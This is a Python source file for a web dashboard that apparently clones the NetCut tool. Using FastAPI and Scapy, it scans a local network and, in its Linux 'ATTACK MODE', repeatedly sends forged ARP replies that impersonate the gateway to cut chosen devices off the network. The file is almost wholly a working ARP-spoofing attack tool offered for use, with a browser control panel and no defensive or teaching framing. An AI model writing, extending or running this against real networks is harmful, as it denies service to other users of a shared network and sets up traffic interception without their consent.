#!/usr/bin/env python3
"""
NetCut Web Dashboard - Cross Platform Edition
Modes:
- Windows  : DEV MODE (UI + API mock)
- Linux    : ATTACK MODE (Real ARP Spoofing)
"""

import asyncio
import uvicorn
import subprocess
import threading
import time
from typing import List, Dict
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
import ipaddress
import os
import platform

# Scapy & network libs (safe to import)
import netifaces
from scapy.all import ARP, Ether, srp, sendp, get_if_hwaddr, conf

# =========================
# ENV DETECTION
# =========================
IS_WINDOWS = os.name == "nt"
IS_LINUX = platform.system().lower() == "linux"
MODE = "DEV" if IS_WINDOWS else "ATTACK"

print(f"[+] Running in {MODE} MODE")

# =========================
# PATH CONFIG
# =========================
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

app = FastAPI(title="NetCut Web Dashboard")

# pastikan folder static ADA
static_dir = os.path.join(BASE_DIR, "static")
if os.path.exists(static_dir):
    app.mount("/static", StaticFiles(directory=static_dir), name="static")

templates = Jinja2Templates(directory=os.path.join(BASE_DIR, "templates"))

conf.verb = 0  # disable scapy verbose

# =========================
# ARP ENGINE
# =========================
class ARPAttack:
    def __init__(self):
        # ⚠️ JANGAN lakukan network / scapy di sini
        self.interface = None
        self.gateway_ip = None
        self.gateway_mac = None
        self.my_mac = None
        self.my_ip = None

        self.targets: Dict[str, str] = {}
        self.active_spoofs: set = set()
        self.running = False
        self.scan_results = []

        # DEV MODE MOCK
        if MODE == "DEV":
            self.interface = "windows-mock"
            self.gateway_ip = "192.168.1.1"
            self.gateway_mac = "AA:BB:CC:DD:EE:FF"
            self.my_mac = "11:22:33:44:55:66"
            self.my_ip = "127.0.0.1"

    # =========================
    # LAZY NETWORK INIT (🔥 FIX UTAMA)
    # =========================
    def init_network(self):
        if MODE == "DEV":
            return

        if self.interface is not None:
            return  # sudah di-init

        self.interface = self.get_default_interface()
        self.gateway_ip = self.get_gateway_ip()
        self.gateway_mac = self.get_gateway_mac()
        self.my_mac = get_if_hwaddr(self.interface)
        self.my_ip = netifaces.ifaddresses(self.interface)[netifaces.AF_INET][0]["addr"]

    # =========================
    # LINUX NETWORK HELPERS
    # =========================
    def get_default_interface(self) -> str:
        result = subprocess.check_output(["ip", "route", "show", "default"]).decode()
        return result.split("dev ")[1].split()[0]

    def get_gateway_ip(self) -> str:
        result = subprocess.check_output(["ip", "route", "show", "default"]).decode()
        return result.split("via ")[1].split()[0]

    def get_gateway_mac(self) -> str:
        arp_request = ARP(pdst=self.gateway_ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        answered = srp(
            broadcast / arp_request,
            timeout=2,
            verbose=False,
            iface=self.interface
        )[0]

        if not answered:
            raise RuntimeError("Gateway MAC not found")

        return answered[0][1].hwsrc

    # =========================
    # NETWORK SCAN
    # =========================
    async def scan_network(self, ip_range: str = None) -> List[Dict]:
        if MODE == "DEV":
            self.scan_results = [
                {"ip": "192.168.1.2", "mac": "00:11:22:33:44:01", "status": "OK", "active": False},
                {"ip": "192.168.1.3", "mac": "00:11:22:33:44:02", "status": "OK", "active": False},
                {"ip": "192.168.1.4", "mac": "00:11:22:33:44:03", "status": "OK", "active": False},
            ]
            self.targets = {h["ip"]: h["mac"] for h in self.scan_results}
            return self.scan_results

        self.init_network()

        if not ip_range:
            network = ipaddress.IPv4Network(f"{self.gateway_ip}/24", strict=False)
            ip_range = str(network)

        arp = ARP(pdst=ip_range)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        result = srp(
            ether / arp,
            timeout=3,
            verbose=False,
            iface=self.interface
        )[0]

        self.targets.clear()
        self.scan_results.clear()

        for _, received in result:
            self.targets[received.psrc] = received.hwsrc
            self.scan_results.append({
                "ip": received.psrc,
                "mac": received.hwsrc,
                "status": "OK",
                "active": False
            })

        self.scan_results.sort(key=lambda x: x["ip"])
        return self.scan_results

    # =========================
    # ARP SPOOFING
    # =========================
    def arp_spoof(self, target_ip: str, spoof: bool = True):
        if MODE == "DEV":
            return True

        target_mac = self.targets.get(target_ip)
        if not target_mac:
            return False

        if spoof:
            pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=self.gateway_ip)
        else:
            pkt = ARP(
                op=2,
                pdst=target_ip,
                hwdst=target_mac,
                psrc=self.gateway_ip,
                hwsrc=self.gateway_mac
            )

        sendp(Ether(dst=target_mac) / pkt, iface=self.interface, verbose=False)
        return True

    def spoof_loop(self, target_ip: str):
        while self.running and target_ip in self.active_spoofs:
            self.arp_spoof(target_ip, spoof=True)
            time.sleep(2)

    def start_spoofing(self, targets: List[str]):
        self.running = True
        self.active_spoofs.update(targets)

        for ip in targets:
            for host in self.scan_results:
                if host["ip"] == ip:
                    host["active"] = True
                    host["status"] = "CUT"

            if MODE == "ATTACK":
                threading.Thread(
                    target=self.spoof_loop,
                    args=(ip,),
                    daemon=True
                ).start()

    def stop_spoofing(self, targets: List[str]):
        for ip in targets:
            self.arp_spoof(ip, spoof=False)
            self.active_spoofs.discard(ip)

            for host in self.scan_results:
                if host["ip"] == ip:
                    host["active"] = False
                    host["status"] = "OK"

        if not self.active_spoofs:
            self.running = False

    def restore_all(self):
        self.stop_spoofing(list(self.active_spoofs))

# =========================
# GLOBAL STATE
# =========================
attack = ARPAttack()

manager = {
    "mode": MODE,
    "status": "idle",
    "targets": [],
    "active": [],
}

# =========================
# WS MANAGER
# =========================
class ConnectionManager:
    def __init__(self):
        self.connections: List[WebSocket] = []

    async def connect(self, ws: WebSocket):
        await ws.accept()
        self.connections.append(ws)

    def disconnect(self, ws: WebSocket):
        if ws in self.connections:
            self.connections.remove(ws)

    async def broadcast(self, data: dict):
        for ws in self.connections:
            try:
                await ws.send_json(data)
            except:
                self.disconnect(ws)

ws_manager = ConnectionManager()

# =========================
# ROUTES
# =========================
@app.get("/", response_class=HTMLResponse)
async def dashboard(request: Request):
    return templates.TemplateResponse(
        "index.html",
        {"request": request}
    )

@app.get("/api/scan")
async def scan(ip_range: str = None):
    manager["status"] = "scanning"
    await ws_manager.broadcast({"type": "status", "data": manager})

    hosts = await attack.scan_network(ip_range)

    manager["targets"] = hosts
    manager["status"] = "ready"

    await ws_manager.broadcast({
        "type": "scan_complete",
        "data": hosts
    })

    return {"hosts": hosts, "count": len(hosts)}

@app.post("/api/spoof")
async def spoof(targets: List[str]):
    attack.start_spoofing(targets)
    manager["active"] = list(attack.active_spoofs)
    manager["status"] = "spoofing"

    await ws_manager.broadcast({
        "type": "spoof_start",
        "targets": targets
    })

    return {"status": "spoofing"}

@app.post("/api/stop")
async def stop(targets: List[str] = None):
    if targets:
        attack.stop_spoofing(targets)
    else:
        attack.restore_all()

    manager["active"] = list(attack.active_spoofs)
    manager["status"] = "idle"

    await ws_manager.broadcast({
        "type": "spoof_stop",
        "targets": targets or "ALL"
    })

    return {"status": "stopped"}

@app.websocket("/ws")
async def websocket_endpoint(ws: WebSocket):
    await ws_manager.connect(ws)
    try:
        while True:
            await ws.receive_text()
    except WebSocketDisconnect:
        ws_manager.disconnect(ws)